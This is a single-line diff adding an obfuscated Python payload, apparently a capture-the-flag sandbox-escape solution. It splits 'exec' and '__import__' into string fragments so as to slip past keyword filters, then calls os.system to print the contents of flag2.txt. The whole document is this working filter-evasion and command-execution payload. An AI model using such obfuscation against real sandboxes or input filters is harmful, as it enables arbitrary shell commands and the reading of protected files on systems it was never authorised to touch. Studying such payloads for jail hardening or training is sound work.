@@ -1,0 +1,1 @@
+vars(__builtins__)['ex'+'ec'](''.join(['__imp','ort__("o','s").sys','tem("cat flag2.txt")']))
